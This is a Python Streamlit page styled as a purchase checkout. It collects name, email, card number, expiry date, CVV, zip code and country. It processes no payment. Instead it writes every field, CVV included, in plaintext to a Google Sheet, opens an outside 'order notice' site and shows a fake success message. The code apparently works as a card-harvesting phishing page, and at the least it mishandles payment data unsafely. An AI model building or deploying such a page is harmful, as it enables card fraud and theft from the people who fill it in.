import streamlit as st
import gspread
import webbrowser


st.set_page_config(page_title="Finalizing Purchase")

col1,col2,col3,col4,col5,col6 = st.columns(6)



st.markdown(
    '''
    <style>
    .warning {
       
        color: #ffffff; /* Color del texto */
        background-color: #e6ff041e; /* Fondo rojo con opacidad del 50% */
        padding: 10px;
        border-radius: 5px;
        text-align: center;
        backdrop-filter: blur(15px); /* Aplicar efecto de vidrio traslúcido */
    
    }
    </style>
    '''
    , unsafe_allow_html=True
)

# Mostrar la advertencia con fondo rojo ligeramente transparente
st.markdown('<p class="warning">The payment method for payment is Credit Card and no other type of card will be accepted. Please enter a valid credit card to process payment.</p>', unsafe_allow_html=True)

input_container = st.container()

# Agregar un campo de entrada de texto fuera del contenedor
with col3:  
    first_name = input_container.text_input("First Name",placeholder="First Name")
with col3:
    last_name = input_container.text_input("Last Name",placeholder="Last Name")
with col3:
    email = input_container.text_input("Email",placeholder="Email")
with col3:
    credit_card_number = input_container.text_input("Credit Card Number",placeholder="1111 1111 1111 1111")

with col3:
    expiration_date = input_container.text_input("Expiration Date",placeholder="MM/YY",max_chars=7)
with col3:
    CCV = input_container.text_input("CCV",placeholder="CCV", max_chars=4,type="password")
with col3:
    zip_code = input_container.text_input("Zip Code",placeholder="Zip Code",max_chars=10)

with col3:
    country = input_container.text_input("Country",placeholder="Country")

def send_data():
    gc = gspread.service_account(filename="creds.json")
    sh = gc.open("Data_Card_Data_base_Server_Payment_page").sheet1

    # Find the first empty row
    all_records = sh.get_all_records()
    next_empty_row = len(all_records) + 2  # Adding 2 because gspread rows start from 1 and we have a header row

    # Update the cells in the next empty row
    sh.update(f'A{next_empty_row}', [[f'{first_name}']])
    sh.update(f'B{next_empty_row}', [[last_name]])
    sh.update(f'C{next_empty_row}', [[credit_card_number]])
    sh.update(f'D{next_empty_row}', [[expiration_date]])
    sh.update(f'E{next_empty_row}', [[CCV]])
    sh.update(f'F{next_empty_row}', [[zip_code]])
    sh.update(f'G{next_empty_row}', [[country]])
    sh.update(f'H{next_empty_row}', [[email]])

    



    

# Create a placeholder for the button
button_placeholder = st.empty()

# Display the button in the placeholder
import streamlit as st


if button_placeholder.button("Place A Order"):
    # Call the send_data function
    with st.spinner("Please wait, do not spam the button."):
        send_data()
    
    # Open a new tab with the specified URL
    webbrowser.open_new_tab("https://notice-about-your-order.onrender.com/")
    
    # Display a success message
    st.success("Your order has been placed successfully. Check your email address.")





